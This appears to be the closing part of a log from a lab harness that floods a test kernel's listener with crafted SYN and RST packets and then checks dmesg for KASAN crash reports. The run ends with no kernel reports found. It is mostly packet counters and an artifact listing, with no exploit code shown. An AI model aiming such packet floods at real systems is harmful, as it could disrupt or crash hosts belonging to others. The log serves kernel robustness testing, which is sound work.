+t+52.003s syn=7031 rtx=30 rounds=10 skipped=7020 reader=2 synack=10 rst=4 err=0
+t+52.254s syn=7065 rtx=30 rounds=10 skipped=7054 reader=2 synack=10 rst=4 err=0
+t+52.504s syn=7098 rtx=30 rounds=10 skipped=7087 reader=2 synack=10 rst=4 err=0
+t+52.52s [info] handshake: rounds=10 skipped=7090 reader-evidence=2 synack=10
+t+52.754s syn=7131 rtx=30 rounds=10 skipped=7120 reader=2 synack=10 rst=4 err=0
+t+53.003s syn=7165 rtx=30 rounds=10 skipped=7154 reader=2 synack=10 rst=4 err=0
+t+53.254s syn=7198 rtx=30 rounds=10 skipped=7187 reader=2 synack=10 rst=4 err=0
+t+53.273s [info] handshake: rounds=10 skipped=7190 reader-evidence=2 synack=10
+t+53.504s syn=7232 rtx=30 rounds=10 skipped=7221 reader=2 synack=10 rst=4 err=0
+t+53.754s syn=7265 rtx=30 rounds=10 skipped=7254 reader=2 synack=10 rst=4 err=0
+t+54.004s syn=7298 rtx=30 rounds=10 skipped=7287 reader=2 synack=10 rst=4 err=0
+t+54.021s [info] handshake: rounds=10 skipped=7290 reader-evidence=2 synack=10
+t+54.254s syn=7332 rtx=30 rounds=10 skipped=7321 reader=2 synack=10 rst=4 err=0
+t+54.504s syn=7366 rtx=30 rounds=10 skipped=7355 reader=2 synack=10 rst=4 err=0
+t+54.75s [info] handshake: rounds=10 skipped=7390 reader-evidence=2 synack=10
+t+54.754s syn=7401 rtx=30 rounds=10 skipped=7390 reader=2 synack=10 rst=4 err=0
+t+55.004s syn=7435 rtx=30 rounds=10 skipped=7424 reader=2 synack=10 rst=4 err=0
+t+55.254s syn=7470 rtx=30 rounds=10 skipped=7459 reader=2 synack=10 rst=4 err=0
+t+55.484s [info] handshake: rounds=10 skipped=7490 reader-evidence=2 synack=10
+t+55.504s syn=7503 rtx=30 rounds=10 skipped=7492 reader=2 synack=10 rst=4 err=0
+t+55.754s syn=7537 rtx=30 rounds=10 skipped=7526 reader=2 synack=10 rst=4 err=0
+t+56.004s syn=7572 rtx=30 rounds=10 skipped=7561 reader=2 synack=10 rst=4 err=0
+t+56.218s [info] handshake: rounds=10 skipped=7590 reader-evidence=2 synack=10
+t+56.255s syn=7606 rtx=30 rounds=10 skipped=7595 reader=2 synack=10 rst=4 err=0
+t+56.504s syn=7639 rtx=30 rounds=10 skipped=7628 reader=2 synack=10 rst=4 err=0
+t+56.754s syn=7674 rtx=30 rounds=10 skipped=7663 reader=2 synack=10 rst=4 err=0
+t+56.946s [info] handshake: rounds=10 skipped=7690 reader-evidence=2 synack=10
+t+57.004s syn=7708 rtx=30 rounds=10 skipped=7697 reader=2 synack=10 rst=4 err=0
+t+57.254s syn=7742 rtx=30 rounds=10 skipped=7731 reader=2 synack=10 rst=4 err=0
+t+57.503s syn=7776 rtx=30 rounds=10 skipped=7765 reader=2 synack=10 rst=4 err=0
+t+57.686s [info] handshake: rounds=10 skipped=7790 reader-evidence=2 synack=10
+t+57.753s syn=7809 rtx=30 rounds=10 skipped=7798 reader=2 synack=10 rst=4 err=0
+t+58.004s syn=7843 rtx=30 rounds=10 skipped=7832 reader=2 synack=10 rst=4 err=0
+t+58.254s syn=7876 rtx=30 rounds=10 skipped=7865 reader=2 synack=10 rst=4 err=0
+t+58.436s [info] handshake: rounds=10 skipped=7890 reader-evidence=2 synack=10
+t+58.504s syn=7910 rtx=30 rounds=10 skipped=7899 reader=2 synack=10 rst=4 err=0
+t+58.754s syn=7944 rtx=30 rounds=10 skipped=7933 reader=2 synack=10 rst=4 err=0
+t+59.004s syn=7977 rtx=30 rounds=10 skipped=7967 reader=2 synack=10 rst=4 err=0
+t+59.18s [info] handshake: rounds=10 skipped=7990 reader-evidence=2 synack=10
+t+59.254s syn=8010 rtx=30 rounds=10 skipped=8000 reader=2 synack=10 rst=4 err=0
+t+59.504s syn=8043 rtx=30 rounds=10 skipped=8032 reader=2 synack=10 rst=4 err=0
+t+59.754s syn=8077 rtx=30 rounds=10 skipped=8066 reader=2 synack=10 rst=4 err=0
+t+59.926s [info] handshake: rounds=10 skipped=8090 reader-evidence=2 synack=10
+t+1m0.003s syn=8111 rtx=30 rounds=10 skipped=8100 reader=2 synack=10 rst=4 err=0
+t+1m0.254s syn=8144 rtx=30 rounds=10 skipped=8133 reader=2 synack=10 rst=4 err=0
+t+1m0.503s syn=8177 rtx=30 rounds=10 skipped=8166 reader=2 synack=10 rst=4 err=0
+t+1m0.678s [info] handshake: rounds=10 skipped=8190 reader-evidence=2 synack=10
+t+1m0.754s syn=8210 rtx=30 rounds=10 skipped=8199 reader=2 synack=10 rst=4 err=0
+t+1m1.004s syn=8244 rtx=30 rounds=10 skipped=8233 reader=2 synack=10 rst=4 err=0
+t+1m1.254s syn=8277 rtx=30 rounds=10 skipped=8266 reader=2 synack=10 rst=4 err=0
+t+1m1.424s [info] handshake: rounds=10 skipped=8290 reader-evidence=2 synack=10
+t+1m1.504s syn=8311 rtx=30 rounds=10 skipped=8300 reader=2 synack=10 rst=4 err=0
+t+1m1.753s syn=8342 rtx=30 rounds=10 skipped=8331 reader=2 synack=10 rst=4 err=0
+t+1m2.003s syn=8374 rtx=30 rounds=10 skipped=8363 reader=2 synack=10 rst=4 err=0
+t+1m2.188s [info] handshake: rounds=10 skipped=8390 reader-evidence=2 synack=10
+t+1m2.254s syn=8409 rtx=30 rounds=10 skipped=8398 reader=2 synack=10 rst=4 err=0
+t+1m2.504s syn=8443 rtx=30 rounds=10 skipped=8432 reader=2 synack=10 rst=4 err=0
+t+1m2.754s syn=8476 rtx=30 rounds=10 skipped=8465 reader=2 synack=10 rst=4 err=0
+t+1m2.926s [info] handshake: rounds=10 skipped=8490 reader-evidence=2 synack=10
+t+1m3.004s syn=8511 rtx=30 rounds=10 skipped=8500 reader=2 synack=10 rst=4 err=0
+t+1m3.253s syn=8543 rtx=30 rounds=10 skipped=8532 reader=2 synack=10 rst=4 err=0
+t+1m3.504s syn=8577 rtx=30 rounds=10 skipped=8566 reader=2 synack=10 rst=4 err=0
+t+1m3.672s [info] handshake: rounds=10 skipped=8590 reader-evidence=2 synack=10
+t+1m3.754s syn=8611 rtx=30 rounds=10 skipped=8600 reader=2 synack=10 rst=4 err=0
+t+1m4.003s syn=8645 rtx=30 rounds=10 skipped=8634 reader=2 synack=10 rst=4 err=0
+t+1m4.254s syn=8678 rtx=30 rounds=10 skipped=8667 reader=2 synack=10 rst=4 err=0
+t+1m4.414s [info] handshake: rounds=10 skipped=8690 reader-evidence=2 synack=10
+t+1m4.503s syn=8712 rtx=30 rounds=10 skipped=8701 reader=2 synack=10 rst=4 err=0
+t+1m4.754s syn=8747 rtx=30 rounds=10 skipped=8736 reader=2 synack=10 rst=4 err=0
+t+1m5.004s syn=8780 rtx=30 rounds=10 skipped=8769 reader=2 synack=10 rst=4 err=0
+t+1m5.153s [info] handshake: rounds=10 skipped=8790 reader-evidence=2 synack=10
+t+1m5.254s syn=8814 rtx=30 rounds=10 skipped=8803 reader=2 synack=10 rst=4 err=0
+t+1m5.504s syn=8847 rtx=30 rounds=10 skipped=8836 reader=2 synack=10 rst=4 err=0
+t+1m5.754s syn=8881 rtx=30 rounds=10 skipped=8870 reader=2 synack=10 rst=4 err=0
+t+1m5.895s [info] handshake: rounds=10 skipped=8890 reader-evidence=2 synack=10
+t+1m6.004s syn=8916 rtx=30 rounds=10 skipped=8905 reader=2 synack=10 rst=4 err=0
+t+1m6.254s syn=8948 rtx=30 rounds=10 skipped=8937 reader=2 synack=10 rst=4 err=0
+t+1m6.504s syn=8982 rtx=30 rounds=10 skipped=8971 reader=2 synack=10 rst=4 err=0
+t+1m6.641s [info] handshake: rounds=10 skipped=8990 reader-evidence=2 synack=10
+t+1m6.753s syn=9017 rtx=30 rounds=10 skipped=9006 reader=2 synack=10 rst=4 err=0
+t+1m7.004s syn=9051 rtx=30 rounds=10 skipped=9040 reader=2 synack=10 rst=4 err=0
+t+1m7.254s syn=9084 rtx=30 rounds=10 skipped=9073 reader=2 synack=10 rst=4 err=0
+t+1m7.367s [info] handshake: rounds=10 skipped=9090 reader-evidence=2 synack=10
+t+1m7.504s syn=9119 rtx=30 rounds=10 skipped=9108 reader=2 synack=10 rst=4 err=0
+t+1m7.754s syn=9153 rtx=30 rounds=10 skipped=9142 reader=2 synack=10 rst=4 err=0
+t+1m8.003s syn=9188 rtx=30 rounds=10 skipped=9177 reader=2 synack=10 rst=4 err=0
+t+1m8.105s [info] handshake: rounds=10 skipped=9190 reader-evidence=2 synack=10
+t+1m8.254s syn=9221 rtx=30 rounds=10 skipped=9210 reader=2 synack=10 rst=4 err=0
+t+1m8.504s syn=9255 rtx=30 rounds=10 skipped=9244 reader=2 synack=10 rst=4 err=0
+t+1m8.754s syn=9290 rtx=30 rounds=10 skipped=9279 reader=2 synack=10 rst=4 err=0
+t+1m8.831s [info] handshake: rounds=10 skipped=9290 reader-evidence=2 synack=10
+t+1m9.003s syn=9325 rtx=30 rounds=10 skipped=9314 reader=2 synack=10 rst=4 err=0
+t+1m9.254s syn=9359 rtx=30 rounds=10 skipped=9348 reader=2 synack=10 rst=4 err=0
+t+1m9.504s syn=9393 rtx=30 rounds=10 skipped=9382 reader=2 synack=10 rst=4 err=0
+t+1m9.561s [info] handshake: rounds=10 skipped=9390 reader-evidence=2 synack=10
+t+1m9.754s syn=9424 rtx=30 rounds=10 skipped=9413 reader=2 synack=10 rst=4 err=0
+t+1m10.004s syn=9457 rtx=30 rounds=10 skipped=9446 reader=2 synack=10 rst=4 err=0
+t+1m10.254s syn=9491 rtx=30 rounds=10 skipped=9480 reader=2 synack=10 rst=4 err=0
+t+1m10.325s [info] handshake: rounds=10 skipped=9490 reader-evidence=2 synack=10
+t+1m10.504s syn=9526 rtx=30 rounds=10 skipped=9515 reader=2 synack=10 rst=4 err=0
+t+1m10.753s syn=9560 rtx=30 rounds=10 skipped=9549 reader=2 synack=10 rst=4 err=0
+t+1m11.004s syn=9594 rtx=30 rounds=10 skipped=9583 reader=2 synack=10 rst=4 err=0
+t+1m11.051s [info] handshake: rounds=10 skipped=9590 reader-evidence=2 synack=10
+t+1m11.254s syn=9628 rtx=30 rounds=10 skipped=9617 reader=2 synack=10 rst=4 err=0
+t+1m11.504s syn=9662 rtx=30 rounds=10 skipped=9651 reader=2 synack=10 rst=4 err=0
+t+1m11.754s syn=9696 rtx=30 rounds=10 skipped=9685 reader=2 synack=10 rst=4 err=0
+t+1m11.788s [info] handshake: rounds=10 skipped=9690 reader-evidence=2 synack=10
+t+1m12.004s syn=9730 rtx=30 rounds=10 skipped=9719 reader=2 synack=10 rst=4 err=0
+t+1m12.254s syn=9764 rtx=30 rounds=10 skipped=9753 reader=2 synack=10 rst=4 err=0
+t+1m12.504s syn=9797 rtx=30 rounds=10 skipped=9786 reader=2 synack=10 rst=4 err=0
+t+1m12.527s [info] handshake: rounds=10 skipped=9790 reader-evidence=2 synack=10
+t+1m12.754s syn=9831 rtx=30 rounds=10 skipped=9820 reader=2 synack=10 rst=4 err=0
+t+1m13.004s syn=9866 rtx=30 rounds=10 skipped=9855 reader=2 synack=10 rst=4 err=0
+t+1m13.254s syn=9900 rtx=30 rounds=10 skipped=9889 reader=2 synack=10 rst=4 err=0
+t+1m13.259s [info] handshake: rounds=10 skipped=9890 reader-evidence=2 synack=10
+t+1m13.504s syn=9934 rtx=30 rounds=10 skipped=9923 reader=2 synack=10 rst=4 err=0
+t+1m13.754s syn=9967 rtx=30 rounds=10 skipped=9956 reader=2 synack=10 rst=4 err=0
+t+1m13.999s [info] handshake: rounds=10 skipped=9990 reader-evidence=2 synack=10
+t+1m14.004s syn=10001 rtx=30 rounds=10 skipped=9990 reader=2 synack=10 rst=4 err=0
+t+1m14.254s syn=10035 rtx=30 rounds=10 skipped=10024 reader=2 synack=10 rst=4 err=0
+t+1m14.504s syn=10069 rtx=30 rounds=10 skipped=10058 reader=2 synack=10 rst=4 err=0
+t+1m14.731s [info] handshake: rounds=10 skipped=10090 reader-evidence=2 synack=10
+t+1m14.754s syn=10104 rtx=30 rounds=10 skipped=10093 reader=2 synack=10 rst=4 err=0
+t+1m15.004s syn=10137 rtx=30 rounds=10 skipped=10126 reader=2 synack=10 rst=4 err=0
+t+1m15.254s syn=10170 rtx=30 rounds=10 skipped=10159 reader=2 synack=10 rst=4 err=0
+t+1m15.472s [info] handshake: rounds=10 skipped=10190 reader-evidence=2 synack=10
+t+1m15.504s syn=10205 rtx=30 rounds=10 skipped=10194 reader=2 synack=10 rst=4 err=0
+t+1m15.754s syn=10238 rtx=30 rounds=10 skipped=10227 reader=2 synack=10 rst=4 err=0
+t+1m16.004s syn=10272 rtx=30 rounds=10 skipped=10261 reader=2 synack=10 rst=4 err=0
+t+1m16.202s [info] handshake: rounds=10 skipped=10290 reader-evidence=2 synack=10
+t+1m16.254s syn=10308 rtx=30 rounds=10 skipped=10297 reader=2 synack=10 rst=4 err=0
+t+1m16.503s syn=10343 rtx=30 rounds=10 skipped=10332 reader=2 synack=10 rst=4 err=0
+t+1m16.754s syn=10375 rtx=30 rounds=10 skipped=10364 reader=2 synack=10 rst=4 err=0
+t+1m16.943s [info] handshake: rounds=10 skipped=10390 reader-evidence=2 synack=10
+t+1m17.003s syn=10409 rtx=30 rounds=10 skipped=10398 reader=2 synack=10 rst=4 err=0
+t+1m17.253s syn=10442 rtx=30 rounds=10 skipped=10431 reader=2 synack=10 rst=4 err=0
+t+1m17.503s syn=10476 rtx=30 rounds=10 skipped=10465 reader=2 synack=10 rst=4 err=0
+t+1m17.687s [info] handshake: rounds=10 skipped=10490 reader-evidence=2 synack=10
+t+1m17.754s syn=10509 rtx=30 rounds=10 skipped=10498 reader=2 synack=10 rst=4 err=0
+t+1m18.004s syn=10543 rtx=30 rounds=10 skipped=10532 reader=2 synack=10 rst=4 err=0
+t+1m18.253s syn=10576 rtx=30 rounds=10 skipped=10565 reader=2 synack=10 rst=4 err=0
+t+1m18.433s [info] handshake: rounds=10 skipped=10590 reader-evidence=2 synack=10
+t+1m18.504s syn=10609 rtx=30 rounds=10 skipped=10598 reader=2 synack=10 rst=4 err=0
+t+1m18.753s syn=10643 rtx=30 rounds=10 skipped=10632 reader=2 synack=10 rst=4 err=0
+t+1m19.004s syn=10677 rtx=30 rounds=10 skipped=10666 reader=2 synack=10 rst=4 err=0
+t+1m19.182s [info] handshake: rounds=10 skipped=10690 reader-evidence=2 synack=10
+t+1m19.254s syn=10710 rtx=30 rounds=10 skipped=10699 reader=2 synack=10 rst=4 err=0
+t+1m19.504s syn=10743 rtx=30 rounds=10 skipped=10732 reader=2 synack=10 rst=4 err=0
+t+1m19.754s syn=10776 rtx=30 rounds=10 skipped=10765 reader=2 synack=10 rst=4 err=0
+t+1m19.93s [info] handshake: rounds=10 skipped=10790 reader-evidence=2 synack=10
+t+1m20.004s syn=10811 rtx=30 rounds=10 skipped=10800 reader=2 synack=10 rst=4 err=0
+t+1m20.254s syn=10845 rtx=30 rounds=10 skipped=10834 reader=2 synack=10 rst=4 err=0
+t+1m20.504s syn=10880 rtx=30 rounds=10 skipped=10869 reader=2 synack=10 rst=4 err=0
+t+1m20.655s [info] handshake: rounds=10 skipped=10890 reader-evidence=2 synack=10
+t+1m20.754s syn=10915 rtx=30 rounds=10 skipped=10904 reader=2 synack=10 rst=4 err=0
+t+1m21.003s syn=10949 rtx=30 rounds=10 skipped=10938 reader=2 synack=10 rst=4 err=0
+t+1m21.254s syn=10983 rtx=30 rounds=10 skipped=10972 reader=2 synack=10 rst=4 err=0
+t+1m21.376s [info] handshake: rounds=10 skipped=10990 reader-evidence=2 synack=10
+t+1m21.504s syn=11017 rtx=30 rounds=10 skipped=11006 reader=2 synack=10 rst=4 err=0
+t+1m21.754s syn=11052 rtx=30 rounds=10 skipped=11041 reader=2 synack=10 rst=4 err=0
+t+1m22.004s syn=11085 rtx=30 rounds=10 skipped=11074 reader=2 synack=10 rst=4 err=0
+t+1m22.124s [info] handshake: rounds=10 skipped=11090 reader-evidence=2 synack=10
+t+1m22.254s syn=11119 rtx=30 rounds=10 skipped=11108 reader=2 synack=10 rst=4 err=0
+t+1m22.503s syn=11153 rtx=30 rounds=10 skipped=11142 reader=2 synack=10 rst=4 err=0
+t+1m22.754s syn=11186 rtx=30 rounds=10 skipped=11175 reader=2 synack=10 rst=4 err=0
+t+1m22.859s [info] handshake: rounds=10 skipped=11190 reader-evidence=2 synack=10
+t+1m23.004s syn=11220 rtx=30 rounds=10 skipped=11209 reader=2 synack=10 rst=4 err=0
+t+1m23.253s syn=11255 rtx=30 rounds=10 skipped=11244 reader=2 synack=10 rst=4 err=0
+t+1m23.504s syn=11288 rtx=30 rounds=10 skipped=11277 reader=2 synack=10 rst=4 err=0
+t+1m23.595s [info] handshake: rounds=10 skipped=11290 reader-evidence=2 synack=10
+t+1m23.754s syn=11322 rtx=30 rounds=10 skipped=11311 reader=2 synack=10 rst=4 err=0
+t+1m24.004s syn=11355 rtx=30 rounds=10 skipped=11344 reader=2 synack=10 rst=4 err=0
+t+1m24.254s syn=11390 rtx=30 rounds=10 skipped=11379 reader=2 synack=10 rst=4 err=0
+t+1m24.338s [info] handshake: rounds=10 skipped=11390 reader-evidence=2 synack=10
+t+1m24.504s syn=11423 rtx=30 rounds=10 skipped=11412 reader=2 synack=10 rst=4 err=0
+t+1m24.754s syn=11457 rtx=30 rounds=10 skipped=11446 reader=2 synack=10 rst=4 err=0
+t+1m25.004s syn=11492 rtx=30 rounds=10 skipped=11481 reader=2 synack=10 rst=4 err=0
+t+1m25.063s [info] handshake: rounds=10 skipped=11490 reader-evidence=2 synack=10
+t+1m25.253s syn=11525 rtx=30 rounds=10 skipped=11514 reader=2 synack=10 rst=4 err=0
+t+1m25.504s syn=11560 rtx=30 rounds=10 skipped=11549 reader=2 synack=10 rst=4 err=0
+t+1m25.754s syn=11594 rtx=30 rounds=10 skipped=11583 reader=2 synack=10 rst=4 err=0
+t+1m25.796s [info] handshake: rounds=10 skipped=11590 reader-evidence=2 synack=10
+t+1m26.004s syn=11628 rtx=30 rounds=10 skipped=11617 reader=2 synack=10 rst=4 err=0
+t+1m26.254s syn=11662 rtx=30 rounds=10 skipped=11651 reader=2 synack=10 rst=4 err=0
+t+1m26.504s syn=11697 rtx=30 rounds=10 skipped=11686 reader=2 synack=10 rst=4 err=0
+t+1m26.533s [info] handshake: rounds=10 skipped=11690 reader-evidence=2 synack=10
+t+1m26.754s syn=11730 rtx=30 rounds=10 skipped=11719 reader=2 synack=10 rst=4 err=0
+t+1m27.004s syn=11764 rtx=30 rounds=10 skipped=11753 reader=2 synack=10 rst=4 err=0
+t+1m27.253s syn=11799 rtx=30 rounds=10 skipped=11788 reader=2 synack=10 rst=4 err=0
+t+1m27.266s [info] handshake: rounds=10 skipped=11790 reader-evidence=2 synack=10
+t+1m27.504s syn=11831 rtx=30 rounds=10 skipped=11820 reader=2 synack=10 rst=4 err=0
+t+1m27.754s syn=11865 rtx=30 rounds=10 skipped=11854 reader=2 synack=10 rst=4 err=0
+t+1m28.004s syn=11898 rtx=30 rounds=10 skipped=11887 reader=2 synack=10 rst=4 err=0
+t+1m28.022s [info] handshake: rounds=10 skipped=11890 reader-evidence=2 synack=10
+t+1m28.254s syn=11932 rtx=30 rounds=10 skipped=11921 reader=2 synack=10 rst=4 err=0
+t+1m28.504s syn=11967 rtx=30 rounds=10 skipped=11956 reader=2 synack=10 rst=4 err=0
+t+1m28.753s syn=11999 rtx=30 rounds=10 skipped=11988 reader=2 synack=10 rst=4 err=0
+t+1m28.761s [info] handshake: rounds=10 skipped=11990 reader-evidence=2 synack=10
+t+1m29.004s syn=12031 rtx=30 rounds=10 skipped=12021 reader=2 synack=10 rst=4 err=0
+t+1m29.253s syn=12066 rtx=30 rounds=10 skipped=12055 reader=2 synack=10 rst=4 err=0
+t+1m29.503s [info] handshake: rounds=10 skipped=12090 reader-evidence=2 synack=10
+t+1m29.504s syn=12100 rtx=30 rounds=10 skipped=12090 reader=2 synack=10 rst=4 err=0
+t+1m29.754s syn=12134 rtx=30 rounds=10 skipped=12123 reader=2 synack=10 rst=4 err=0
+t+1m30.004s syn=12166 rtx=30 rounds=10 skipped=12155 reader=2 synack=10 rst=4 err=0
+[headless] duration elapsed, stopping
+[headless] done: syn=12167 rtx=30 total=12197 send_err=0 synack=10 rst=4 other=2
+[headless] handshake: rounds=10 skipped=12156 reader-evidence=2 rst-to-round=4
+[headless] check the target: dmesg | grep -i kasan
+attack rc=0
+end:   2026-11-02 22:34:17 UTC
+=== [5/7] harvest ===
+12248 packets captured
+12248 packets received by filter
+0 packets dropped by kernel
+auto-RST filter: removed
+no NEW KASAN/panic lines in dmesg
+events.log: 0 lines
+=== [6/7] verdict ===
+kernel: 6.1.189
+kasan:  91
+hits:
+
+listener final (accepted = handshakes completed, released = our RST reset the children):
+listener 0.0.0.0:9000: accepted=0 held=0 released=0
+listener 0.0.0.0:9000: accepted=0 held=0 released=0
+[listener] interrupted, closing
+[listener] done: accepted=5 released=0
+
+engine final:
+[headless] done: syn=12167 rtx=30 total=12197 send_err=0 synack=10 rst=4 other=2
+[headless] handshake: rounds=10 skipped=12156 reader-evidence=2 rst-to-round=4
+[headless] check the target: dmesg | grep -i kasan
+>>> MISS: no kernel reports
+=== [7/7] list ===
+total 1.3M
+-rw-r--r-- 1 tcpdump tcpdump 1.1M Nov  2 22:34 attack.pcap
+-rw-r--r-- 1 labuser labuser 2.5K Nov  2 22:34 config-used.toml
+-rw-r--r-- 1 labuser labuser  42K Nov  2 22:32 dmesg-baseline.txt
+-rw-r--r-- 1 labuser labuser   52 Nov  2 22:34 dmesg-new.txt
+-rw-r--r-- 1 labuser labuser  42K Nov  2 22:34 dmesg.txt
+-rw-r--r-- 1 labuser labuser  16K Nov  2 22:34 docker-inspect.json
+-rw-r--r-- 1 labuser labuser 1.5K Nov  2 22:32 dryrun.txt
+-rw-r--r-- 1 labuser labuser  495 Nov  2 22:32 env.txt
+-rw-r--r-- 1 labuser labuser    0 Nov  2 22:34 events.log
+-rw-r--r-- 1 labuser labuser    0 Nov  2 22:34 hits.txt
+-rw-r--r-- 1 labuser labuser  270 Nov  2 22:32 listener-start.log
+-rw-r--r-- 1 labuser labuser 1.6K Nov  2 22:34 listener.log
+-rw-r--r-- 1 labuser labuser  39K Nov  2 22:34 stdout.log
+=== FIRE DONE: /home/labuser/lab/artifacts-hs-ebpf-1793658753 ===
